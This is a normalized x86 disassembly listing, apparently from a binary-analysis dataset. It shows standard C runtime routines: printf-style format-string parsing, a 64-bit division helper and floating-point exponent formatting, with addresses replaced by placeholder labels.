or [ ebp - 0x408 ] 0x1000
mov [ ebp - 0x440 ] esi
jmp r-xdata
or [ ebp - 0x408 ] 0x800
jmp r-xdata
add ebx 0x4
test [ ebp - 0x408 ] 0x20
mov [ ebp - 0x41c ] ebx
mov ebx [ ebx - 0x4 ]
mov [ ebp - 0x410 ] ebx
je r-xdata
mov edi 0x7fffffff
mov [ ebp - 0x418 ] 0xa
sub eax 0x3
jne r-xdata
test [ ebp - 0x408 ] 0x80
mov [ ebp - 0x418 ] 0x10
je r-xdata
cmp [ ebp - 0x43c ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
add ebx 0x4
test [ ebp - 0x408 ] 0x20
je r-xdata
mov [ ebp - 0x41c ] ebx
mov [ ebp - 0x448 ] ecx
jmp r-xdata
sub eax edi
je r-xdata
test [ ebp - 0x408 ] 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or [ ebp - 0x408 ] 0x8
jmp r-xdata
cmp ax 0x6f
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
mov [ ebp - 0x448 ] 0x27
test [ ebp - 0x408 ] 0x8000
je r-xdata
push 0x30
pop eax
mov [ ebp - 0x438 ] ax
mov eax [ ebp - 0x448 ]
add eax 0x51
mov [ ebp - 0x436 ] ax
mov [ ebp - 0x424 ] edi
jmp r-xdata
cmp [ ebp - 0x444 ] 0x0
je r-xdata
mov eax [ ebp - 0x408 ]
test al 0x40
je r-xdata
or [ ebp - 0x408 ] 0x40
cmp [ ebp - 0x40c ] 0x0
lea esi [ ebp - 0x404 ]
mov eax 0x200
mov [ ebp - 0x410 ] esi
mov [ ebp - 0x414 ] eax
jge r-xdata
cmp eax 0x69
je r-xdata
test [ ebp - 0x408 ] 0x40
mov eax [ ebx - 0x4 ]
je r-xdata
test [ ebp - 0x408 ] 0x40
mov [ ebp - 0x41c ] ebx
je r-xdata
test [ ebp - 0x408 ] 0x9000
mov ebx edx
mov edi eax
jne r-xdata
test edx edx
jg r-xdata
mov eax [ ebx ]
add ebx 0x4
mov [ ebp - 0x41c ] ebx
test eax eax
je r-xdata
sub eax ecx
je r-xdata
or [ ebp - 0x408 ] 0x20
add edx 0x20
mov [ ebp - 0x460 ] 0x1
mov [ ebp - 0x418 ] edx
sub eax edi
je r-xdata
cmp ax 0x75
je r-xdata
mov eax [ ebp - 0x410 ]
mov [ ebp - 0x428 ] 0x1
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
and [ ebp - 0x414 ] 0x0
mov esi [ ebp - 0x410 ]
test edi edi
jle r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
push [ ebp - 0x444 ]
call sub_415093
and [ ebp - 0x444 ] 0x0
mov ebx [ ebp - 0x42c ]
mov esi [ ebp - 0x414 ]
sub ebx esi
sub ebx [ ebp - 0x424 ]
test [ ebp - 0x408 ] 0xc
jne r-xdata
test eax 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x40c ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
xor edx edx
cdq
jmp r-xdata
movzx eax [ ebx - 0x4 ]
movsx eax [ ebx - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x40c ] 0x0
jge r-xdata
xor ebx ebx
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
push eax
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
sub eax edi
jne r-xdata
test [ ebp - 0x408 ] 0x830
jne r-xdata
sub eax edi
je r-xdata
cmp ax 0x78
je r-xdata
test edi edi
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
push [ ebp - 0x424 ]
mov edi [ ebp - 0x430 ]
lea eax [ ebp - 0x420 ]
lea ecx [ ebp - 0x438 ]
call sub_41d2c8
test [ ebp - 0x408 ] 0x8
pop ecx
je r-xdata
push [ ebp - 0x430 ]
lea eax [ ebp - 0x420 ]
push ebx
push 0x20
call sub_41c709
add esp 0xc
test al 0x1
je r-xdata
push 0x2d
jmp r-xdata
cmp [ ebp - 0x40c ] eax
jle r-xdata
cmp dx 0x67
jne r-xdata
mov eax [ ebx ]
add ebx 0x8
mov [ ebp - 0x46c ] eax
mov eax [ ebx - 0x4 ]
mov [ ebp - 0x468 ] eax
lea eax [ ebp - 0x458 ]
push eax
push [ ebp - 0x460 ]
movsx eax dl
push [ ebp - 0x40c ]
mov [ ebp - 0x41c ] ebx
push eax
push [ ebp - 0x414 ]
lea eax [ ebp - 0x46c ]
push esi
push eax
push [ rw-data ]
call sub_419dec
pop ecx
call eax
mov ebx [ ebp - 0x408 ]
add esp 0x1c
and ebx 0x80
je r-xdata
mov esi [ ebx ]
add ebx 0x4
mov [ ebp - 0x41c ] ebx
call sub_4214a2
test eax eax
je r-xdata
cmp eax 0x6f
jne r-xdata
test [ ebp - 0x408 ] 0x40
je r-xdata
cdq
jmp r-xdata
and [ ebp - 0x408 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0x40c ] eax
jle r-xdata
mov [ ebp - 0x40c ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
neg edx
or [ ebp - 0x408 ] 0x100
test eax eax
jae r-xdata
mov [ ebp - 0x414 ] eax
test [ ebp - 0x408 ] 0x800
movsx eax [ eax ]
mov [ ebp - 0x410 ] ecx
je r-xdata
movzx eax [ ebx ]
add ebx 0x4
xor esi esi
inc esi
test [ ebp - 0x408 ] 0x20
mov [ ebp - 0x428 ] esi
mov [ ebp - 0x41c ] ebx
mov [ ebp - 0x464 ] eax
je r-xdata
or [ ebp - 0x408 ] 0x20
jmp r-xdata
sub eax edi
jne r-xdata
cmp ax 0x58
je r-xdata
dec edi
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x410 ]
lea ecx [ ebp - 0x458 ]
movzx eax al
push ecx
push eax
call sub_4215e9
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x428 ] 0x0
jne r-xdata
test [ ebp - 0x408 ] 0x4
jne r-xdata
test al 0x2
je r-xdata
push 0x2b
jmp r-xdata
pop eax
mov [ ebp - 0x438 ] ax
mov [ ebp - 0x424 ] 0x1
cmp [ ebp - 0x40c ] 0xa3
jle r-xdata
mov [ ebp - 0x40c ] eax
mov [ ebp - 0x40c ] 0x1
jmp r-xdata
cmp [ ebp - 0x418 ] 0x67
jne r-xdata
cmp [ ebp - 0x40c ] 0x0
jne r-xdata
call sub_4162ac
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
jmp r-xdata
test [ ebp - 0x408 ] 0x20
je r-xdata
test [ ebp - 0x408 ] 0x80
mov [ ebp - 0x418 ] 0x8
je r-xdata
mov eax edi
or eax ebx
jne r-xdata
mov [ ebp - 0x40c ] eax
and [ ebp - 0x428 ] 0x0
jmp r-xdata
cdq
sub eax edx
mov [ ebp - 0x428 ] 0x1
jmp r-xdata
mov [ ebp - 0x404 ] ax
mov [ ebp - 0x434 ] al
lea eax [ ebp - 0x458 ]
push eax
mov eax [ ebp - 0x458 ]
mov [ ebp - 0x433 ] 0x0
push [ eax + 0xac ]
lea eax [ ebp - 0x434 ]
push eax
lea eax [ ebp - 0x404 ]
push eax
call sub_4214b8
add esp 0x10
test eax eax
jge r-xdata
and [ ebp - 0x45c ] 0x0
inc eax
inc eax
inc esi
inc [ ebp - 0x414 ]
cmp [ ebp - 0x414 ] edi
jl r-xdata
inc esi
mov ecx [ ebp - 0x410 ]
push esi
lea eax [ ebp - 0x420 ]
call sub_41d2c8
pop ecx
test esi esi
jle r-xdata
push edi
push ebx
push 0x30
lea eax [ ebp - 0x420 ]
call sub_41c709
add esp 0xc
push 0x20
mov edi [ ebp - 0x40c ]
add edi 0x15d
push edi
call sub_41a9de
mov edx [ ebp - 0x418 ]
pop ecx
mov [ ebp - 0x444 ] eax
test eax eax
je r-xdata
cmp [ esi ] 0x2d
jne r-xdata
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x458 ]
push eax
push esi
push [ rw-data ]
call sub_419dec
pop ecx
call eax
pop ecx
pop ecx
call sub_4153b1
add esp 0x14
cmp [ ebp - 0x44c ] 0x0
je r-xdata
mov eax [ ebp - 0x420 ]
mov [ esi ] eax
mov ax [ ebp - 0x420 ]
mov [ esi ] ax
jmp r-xdata
or [ ebp - 0x408 ] 0x200
jmp r-xdata
lea esi [ ebp - 0x205 ]
and [ ebp - 0x424 ] eax
sar eax 0x1
lea eax [ ebp - 0x404 ]
mov [ ebp - 0x410 ] eax
mov [ ebp - 0x414 ] esi
jmp r-xdata
mov [ ebp - 0x43c ] esi
jmp r-xdata
jmp r-xdata
test [ ebp - 0x408 ] 0x4
je r-xdata
mov edi [ ebp - 0x410 ]
mov [ ebp - 0x418 ] esi
mov [ ebp - 0x40c ] 0xa3
mov [ ebp - 0x410 ] eax
mov [ ebp - 0x414 ] edi
mov esi eax
jmp r-xdata
push esi
jmp r-xdata
or [ ebp - 0x408 ] 0x100
inc esi
mov [ ebp - 0x410 ] esi
lea eax [ ebp - 0x458 ]
push eax
push esi
push [ rw-data ]
call sub_419dec
pop ecx
call eax
pop ecx
pop ecx
mov [ ebp - 0x43c ] 0x1
jmp r-xdata
mov eax [ ebp - 0x418 ]
cdq
push edx
push eax
push ebx
push edi
call sub_41dec0
add ecx 0x30
cmp ecx 0x39
mov [ ebp - 0x470 ] ebx
mov edi eax
mov ebx edx
jle r-xdata
mov eax edi
or eax ebx
je r-xdata
push [ ebp - 0x430 ]
lea eax [ ebp - 0x420 ]
push ebx
push 0x20
call sub_41c709
add esp 0xc
or [ ebp - 0x420 ] 0xffffffff
jmp r-xdata
push [ ebp - 0x464 ]
mov eax [ ebp - 0x430 ]
lea esi [ ebp - 0x420 ]
call sub_41c6da
add edi [ ebp - 0x470 ]
cmp [ ebp - 0x418 ] 0x0
pop ecx
jg r-xdata
call sub_418e20
pop ecx
jmp r-xdata
mov [ esi ] cl
dec esi
jmp r-xdata
add ecx [ ebp - 0x448 ]
lea eax [ ebp - 0x205 ]
sub eax esi
inc esi
test [ ebp - 0x408 ] 0x200
mov [ ebp - 0x414 ] eax
mov [ ebp - 0x410 ] esi
je r-xdata
cmp [ ebp - 0x420 ] 0x0
jl r-xdata
dec [ ebp - 0x418 ]
lea eax [ ebp - 0x458 ]
push eax
mov eax [ ebp - 0x458 ]
push [ eax + 0xac ]
lea eax [ ebp - 0x464 ]
push edi
push eax
call sub_4214b8
add esp 0x10
mov [ ebp - 0x470 ] eax
test eax eax
jle r-xdata
jmp r-xdata
mov eax [ ebp - 0x40c ]
dec [ ebp - 0x40c ]
test eax eax
jg r-xdata
test eax eax
je r-xdata
dec [ ebp - 0x410 ]
mov ecx [ ebp - 0x410 ]
mov [ ecx ] 0x30
inc eax
jmp r-xdata
mov ecx esi
cmp [ ecx ] 0x30
je r-xdata
sub_41d2c8
mov edi edi
push ebp
mov ebp esp
test [ edi + 0xc ] 0x40
push ebx
push esi
mov esi eax
mov ebx ecx
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
movzx eax [ ebx ]
dec [ ebp + 0x8 ]
push eax
mov eax edi
call sub_41c6da
inc ebx
inc ebx
cmp [ esi ] 0xffffffff
pop ecx
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
add [ esi ] eax
jmp r-xdata
call sub_4162ac
cmp [ eax ] 0x2a
jne r-xdata
push 0x3f
mov eax edi
call sub_41c6da
pop ecx
sub_41d31a
mov edi edi
push ebp
mov ebp esp
sub esp 0x474
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x44c ]
mov [ ebp - 0x43c ] esi
mov [ ebp - 0x418 ] ebx
mov [ ebp - 0x454 ] eax
mov [ ebp - 0x408 ] eax
mov [ ebp - 0x42c ] eax
mov [ ebp - 0x40c ] eax
mov [ ebp - 0x424 ] eax
mov [ ebp - 0x450 ] eax
mov [ ebp - 0x428 ] eax
call sub_41c653
test esi esi
jne r-xdata
xor esi esi
cmp edi esi
jne r-xdata
call sub_4162ac
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
movzx ecx [ edi ]
mov [ ebp - 0x420 ] esi
mov [ ebp - 0x414 ] esi
mov [ ebp - 0x434 ] esi
mov [ ebp - 0x458 ] esi
mov [ ebp - 0x41c ] ecx
cmp cx si
je r-xdata
call sub_4162ac
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
push esi
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x444 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x440 ] 0x0
je r-xdata
push 0x2
pop edx
add edi edx
cmp [ ebp - 0x420 ] esi
mov [ ebp - 0x460 ] edi
jl r-xdata
call sub_4153b1
add esp 0x14
cmp [ ebp - 0x440 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_414a33
leave
retn
mov eax [ ebp - 0x420 ]
mov eax [ ebp - 0x444 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x434 ] esi
je r-xdata
lea eax [ ecx - 0x20 ]
cmp ax 0x58
ja r-xdata
cmp [ ebp - 0x434 ] 0x7
jne r-xdata
xor eax eax
movzx eax cx
movzx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
cmp eax 0x7
ja r-xdata
mov esi [ ebp - 0x434 ]
imul eax eax 0x9
movzx eax [ eax + esi + r--data ]
push 0x8
shr eax 0x4
pop esi
mov [ ebp - 0x434 ] eax
cmp eax esi
je r-xdata
mov edi [ ebp - 0x460 ]
mov ebx [ ebp - 0x418 ]
jmp [ eax * 4 + jump_table_41de9a ]
mov ecx eax
jmp r-xdata
xor eax eax
or [ ebp - 0x40c ] 0xffffffff
mov [ ebp - 0x45c ] eax
mov [ ebp - 0x450 ] eax
mov [ ebp - 0x42c ] eax
mov [ ebp - 0x424 ] eax
mov [ ebp - 0x408 ] eax
mov [ ebp - 0x428 ] eax
jmp r-xdata
movzx eax cx
sub eax 0x20
je r-xdata
cmp cx 0x2a
jne r-xdata
and [ ebp - 0x40c ] 0x0
jmp r-xdata
cmp cx 0x2a
jne r-xdata
movzx eax cx
cmp eax 0x49
je r-xdata
mov eax [ ebp - 0x43c ]
push ecx
lea esi [ ebp - 0x420 ]
mov [ ebp - 0x428 ] 0x1
call sub_41c6da
pop ecx
jmp r-xdata
movzx eax cx
cmp eax 0x64
jg r-xdata
movzx eax [ edi ]
xor esi esi
mov [ ebp - 0x41c ] eax
cmp ax si
je r-xdata
or [ ebp - 0x408 ] edx
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x42c ]
imul eax eax 0xa
movzx ecx cx
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x42c ] eax
jmp r-xdata
mov eax [ ebx ]
add ebx 0x4
mov [ ebp - 0x418 ] ebx
mov [ ebp - 0x42c ] eax
test eax eax
jge r-xdata
mov eax [ ebp - 0x40c ]
imul eax eax 0xa
movzx ecx cx
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x40c ] eax
jmp r-xdata
mov eax [ ebx ]
add ebx 0x4
mov [ ebp - 0x418 ] ebx
mov [ ebp - 0x40c ] eax
test eax eax
jge r-xdata
movzx eax [ edi ]
cmp ax 0x36
jne r-xdata
cmp eax 0x68
je r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x80
jmp r-xdata
sub eax esi
je r-xdata
or [ ebp - 0x408 ] 0x4
neg [ ebp - 0x42c ]
jmp r-xdata
or [ ebp - 0x40c ] 0xffffffff
jmp r-xdata
cmp ax 0x33
jne r-xdata
cmp [ edi + 0x2 ] 0x34
jne r-xdata
or [ ebp - 0x408 ] 0x20
jmp r-xdata
cmp eax 0x6c
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x40
cmp eax 0x53
jg r-xdata
or [ ebp - 0x408 ] 0x1
jmp r-xdata
sub eax edx
je r-xdata
cmp ax 0x64
je r-xdata
cmp [ edi + 0x2 ] 0x32
jne r-xdata
add edi 0x4
or [ ebp - 0x408 ] 0x8000
jmp r-xdata
cmp [ edi ] 0x6c
jne r-xdata
cmp eax 0x77
jne r-xdata
mov edi [ ebp - 0x40c ]
cmp edi 0xffffffff
jne r-xdata
sub eax edx
je r-xdata
mov [ ebp - 0x40c ] esi
cmp eax 0x65
jl r-xdata
test [ ebp - 0x408 ] 0x1000
jne r-xdata
add ebx esi
mov eax [ ebx - 0x8 ]
mov edx [ ebx - 0x4 ]
jmp r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp ax 0x69
je r-xdata
add edi 0x4
and [ ebp - 0x408 ] 0xffff7fff
jmp r-xdata
or [ ebp - 0x408 ] 0x10
jmp r-xdata
add edi edx
or [ ebp - 0x408 ] 0x1000
jmp r-xdata
or [ ebp - 0x408 ] 0x800
jmp r-xdata
add ebx 0x4
test [ ebp - 0x408 ] 0x20
mov [ ebp - 0x418 ] ebx
mov ebx [ ebx - 0x4 ]
mov [ ebp - 0x410 ] ebx
je r-xdata
mov edi 0x7fffffff
mov [ ebp - 0x41c ] 0xa
sub eax 0x3
jne r-xdata
test [ ebp - 0x408 ] 0x80
mov [ ebp - 0x41c ] 0x10
je r-xdata
cmp [ ebp - 0x450 ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
add ebx 0x4
test [ ebp - 0x408 ] 0x20
je r-xdata
mov [ ebp - 0x418 ] ebx
mov [ ebp - 0x454 ] 0x7
jmp r-xdata
sub eax edx
je r-xdata
test [ ebp - 0x408 ] 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or [ ebp - 0x408 ] esi
jmp r-xdata
cmp ax 0x6f
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
mov [ ebp - 0x454 ] 0x27
test [ ebp - 0x408 ] 0x8000
je r-xdata
push 0x30
pop eax
mov [ ebp - 0x430 ] ax
mov eax [ ebp - 0x454 ]
add eax 0x51
mov [ ebp - 0x42e ] ax
mov [ ebp - 0x424 ] edx
jmp r-xdata
cmp [ ebp - 0x458 ] 0x0
je r-xdata
mov eax [ ebp - 0x408 ]
test al 0x40
je r-xdata
or [ ebp - 0x408 ] 0x40
cmp [ ebp - 0x40c ] 0x0
lea esi [ ebp - 0x404 ]
mov eax 0x200
mov [ ebp - 0x410 ] esi
mov [ ebp - 0x414 ] eax
jge r-xdata
cmp eax 0x69
je r-xdata
test [ ebp - 0x408 ] 0x40
mov eax [ ebx - 0x4 ]
je r-xdata
test [ ebp - 0x408 ] 0x40
mov [ ebp - 0x418 ] ebx
je r-xdata
test [ ebp - 0x408 ] 0x9000
mov ebx edx
mov edi eax
jne r-xdata
test edx edx
jg r-xdata
mov eax [ ebx ]
add ebx 0x4
mov [ ebp - 0x418 ] ebx
test eax eax
je r-xdata
sub eax 0x7
je r-xdata
or [ ebp - 0x408 ] 0x20
add ecx 0x20
mov [ ebp - 0x45c ] 0x1
mov [ ebp - 0x41c ] ecx
sub eax edx
je r-xdata
cmp ax 0x75
je r-xdata
mov eax [ ebp - 0x410 ]
mov [ ebp - 0x428 ] 0x1
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
and [ ebp - 0x414 ] 0x0
mov esi [ ebp - 0x410 ]
test edi edi
jle r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
push [ ebp - 0x458 ]
call sub_415093
and [ ebp - 0x458 ] 0x0
pop ecx
mov ebx [ ebp - 0x42c ]
mov esi [ ebp - 0x414 ]
sub ebx esi
sub ebx [ ebp - 0x424 ]
test [ ebp - 0x408 ] 0xc
jne r-xdata
test eax 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x40c ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
xor edx edx
cdq
jmp r-xdata
movzx eax [ ebx - 0x4 ]
movsx eax [ ebx - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x40c ] 0x0
jge r-xdata
xor ebx ebx
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
push eax
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
sub eax edx
jne r-xdata
test [ ebp - 0x408 ] 0x830
jne r-xdata
sub eax edx
je r-xdata
cmp ax 0x78
je r-xdata
test edi edi
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
push [ ebp - 0x424 ]
mov edi [ ebp - 0x43c ]
lea eax [ ebp - 0x420 ]
lea ecx [ ebp - 0x430 ]
call sub_41d2c8
test [ ebp - 0x408 ] 0x8
pop ecx
je r-xdata
push [ ebp - 0x43c ]
lea eax [ ebp - 0x420 ]
push ebx
push 0x20
call sub_41c709
add esp 0xc
test al 0x1
je r-xdata
push 0x2d
jmp r-xdata
cmp [ ebp - 0x40c ] eax
jle r-xdata
cmp cx 0x67
jne r-xdata
mov eax [ ebx ]
add ebx 0x8
mov [ ebp - 0x46c ] eax
mov eax [ ebx - 0x4 ]
mov [ ebp - 0x468 ] eax
lea eax [ ebp - 0x44c ]
push eax
push [ ebp - 0x45c ]
movsx eax cl
push [ ebp - 0x40c ]
mov [ ebp - 0x418 ] ebx
push eax
push [ ebp - 0x414 ]
lea eax [ ebp - 0x46c ]
push esi
push eax
push [ rw-data ]
call sub_419dec
pop ecx
call eax
mov ebx [ ebp - 0x408 ]
add esp 0x1c
and ebx 0x80
je r-xdata
mov esi [ ebx ]
add ebx 0x4
mov [ ebp - 0x418 ] ebx
call sub_4214a2
test eax eax
je r-xdata
cmp eax 0x6f
jne r-xdata
test [ ebp - 0x408 ] 0x40
je r-xdata
cdq
jmp r-xdata
and [ ebp - 0x408 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0x40c ] eax
jle r-xdata
mov [ ebp - 0x40c ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
neg edx
or [ ebp - 0x408 ] 0x100
test eax eax
jae r-xdata
mov [ ebp - 0x414 ] eax
test [ ebp - 0x408 ] 0x800
movsx eax [ eax ]
mov [ ebp - 0x410 ] ecx
je r-xdata
movzx eax [ ebx ]
add ebx 0x4
xor esi esi
inc esi
test [ ebp - 0x408 ] 0x20
mov [ ebp - 0x428 ] esi
mov [ ebp - 0x418 ] ebx
mov [ ebp - 0x464 ] eax
je r-xdata
or [ ebp - 0x408 ] 0x20
jmp r-xdata
sub eax edx
jne r-xdata
cmp ax 0x58
je r-xdata
dec edi
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x410 ]
lea ecx [ ebp - 0x44c ]
movzx eax al
push ecx
push eax
call sub_4215e9
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x428 ] 0x0
jne r-xdata
test [ ebp - 0x408 ] 0x4
jne r-xdata
test al 0x2
je r-xdata
push 0x2b
jmp r-xdata
pop eax
mov [ ebp - 0x430 ] ax
mov [ ebp - 0x424 ] 0x1
cmp [ ebp - 0x40c ] 0xa3
jle r-xdata
mov [ ebp - 0x40c ] eax
mov [ ebp - 0x40c ] 0x1
jmp r-xdata
cmp [ ebp - 0x41c ] 0x67
jne r-xdata
cmp [ ebp - 0x40c ] 0x0
jne r-xdata
test [ ebp - 0x408 ] 0x20
je r-xdata
test [ ebp - 0x408 ] 0x80
mov [ ebp - 0x41c ] esi
je r-xdata
mov eax edi
or eax ebx
jne r-xdata
mov [ ebp - 0x40c ] eax
and [ ebp - 0x428 ] 0x0
jmp r-xdata
cdq
sub eax edx
mov [ ebp - 0x428 ] 0x1
jmp r-xdata
mov [ ebp - 0x404 ] ax
mov [ ebp - 0x438 ] al
lea eax [ ebp - 0x44c ]
push eax
mov eax [ ebp - 0x44c ]
mov [ ebp - 0x437 ] 0x0
push [ eax + 0xac ]
lea eax [ ebp - 0x438 ]
push eax
lea eax [ ebp - 0x404 ]
push eax
call sub_4214b8
add esp 0x10
test eax eax
jge r-xdata
and [ ebp - 0x434 ] 0x0
add eax edx
inc esi
inc [ ebp - 0x414 ]
cmp [ ebp - 0x414 ] edi
jl r-xdata
inc esi
mov ecx [ ebp - 0x410 ]
push esi
lea eax [ ebp - 0x420 ]
call sub_41d2c8
pop ecx
test esi esi
jle r-xdata
push edi
push ebx
push 0x30
lea eax [ ebp - 0x420 ]
call sub_41c709
add esp 0xc
push 0x20
mov edi [ ebp - 0x40c ]
add edi 0x15d
push edi
call sub_41a9de
pop ecx
mov ecx [ ebp - 0x41c ]
mov [ ebp - 0x458 ] eax
test eax eax
je r-xdata
cmp [ esi ] 0x2d
jne r-xdata
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x44c ]
push eax
push esi
push [ rw-data ]
call sub_419dec
pop ecx
call eax
pop ecx
pop ecx
mov eax [ ebp - 0x420 ]
mov [ esi ] eax
mov ax [ ebp - 0x420 ]
mov [ esi ] ax
jmp r-xdata
or [ ebp - 0x408 ] 0x200
jmp r-xdata
lea esi [ ebp - 0x205 ]
and [ ebp - 0x424 ] eax
sar eax 0x1
lea eax [ ebp - 0x404 ]
mov [ ebp - 0x410 ] eax
mov [ ebp - 0x414 ] esi
jmp r-xdata
mov [ ebp - 0x450 ] esi
jmp r-xdata
jmp r-xdata
test [ ebp - 0x408 ] 0x4
je r-xdata
mov edi [ ebp - 0x410 ]
mov [ ebp - 0x41c ] esi
mov [ ebp - 0x40c ] 0xa3
mov [ ebp - 0x410 ] eax
mov [ ebp - 0x414 ] edi
mov esi eax
jmp r-xdata
push esi
jmp r-xdata
or [ ebp - 0x408 ] 0x100
inc esi
mov [ ebp - 0x410 ] esi
lea eax [ ebp - 0x44c ]
push eax
push esi
push [ rw-data ]
call sub_419dec
pop ecx
call eax
pop ecx
pop ecx
mov [ ebp - 0x450 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x41c ]
cdq
push edx
push eax
push ebx
push edi
call sub_41dec0
add ecx 0x30
cmp ecx 0x39
mov [ ebp - 0x470 ] ebx
mov edi eax
mov ebx edx
jle r-xdata
mov eax edi
or eax ebx
je r-xdata
push [ ebp - 0x43c ]
lea eax [ ebp - 0x420 ]
push ebx
push 0x20
call sub_41c709
add esp 0xc
or [ ebp - 0x420 ] 0xffffffff
jmp r-xdata
push [ ebp - 0x464 ]
mov eax [ ebp - 0x43c ]
lea esi [ ebp - 0x420 ]
call sub_41c6da
add edi [ ebp - 0x470 ]
cmp [ ebp - 0x41c ] 0x0
pop ecx
jg r-xdata
call sub_418e20
pop ecx
jmp r-xdata
mov [ esi ] cl
dec esi
jmp r-xdata
add ecx [ ebp - 0x454 ]
lea eax [ ebp - 0x205 ]
sub eax esi
inc esi
test [ ebp - 0x408 ] 0x200
mov [ ebp - 0x414 ] eax
mov [ ebp - 0x410 ] esi
je r-xdata
cmp [ ebp - 0x420 ] 0x0
jl r-xdata
dec [ ebp - 0x41c ]
lea eax [ ebp - 0x44c ]
push eax
mov eax [ ebp - 0x44c ]
push [ eax + 0xac ]
lea eax [ ebp - 0x464 ]
push edi
push eax
call sub_4214b8
add esp 0x10
mov [ ebp - 0x470 ] eax
test eax eax
jle r-xdata
jmp r-xdata
mov eax [ ebp - 0x40c ]
dec [ ebp - 0x40c ]
test eax eax
jg r-xdata
test eax eax
je r-xdata
dec [ ebp - 0x410 ]
mov ecx [ ebp - 0x410 ]
mov [ ecx ] 0x30
inc eax
jmp r-xdata
mov ecx esi
cmp [ ecx ] 0x30
je r-xdata
sub_41dec0
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_41df55
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_41c653
mov esi [ ebp + 0x8 ]
movsx eax [ esi ]
push eax
call sub_421782
cmp eax 0x65
jmp r-xdata
pop ecx
jne r-xdata
inc esi
movzx eax [ esi ]
push eax
call sub_42068c
test eax eax
movsx eax [ esi ]
push eax
call sub_421782
pop ecx
cmp eax 0x78
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov al [ esi ]
mov cl [ ecx ]
mov [ esi ] cl
inc esi
inc esi
inc esi
mov cl [ esi ]
mov [ esi ] al
mov al cl
mov cl [ esi ]
inc esi
test cl cl
jne r-xdata
pop esi
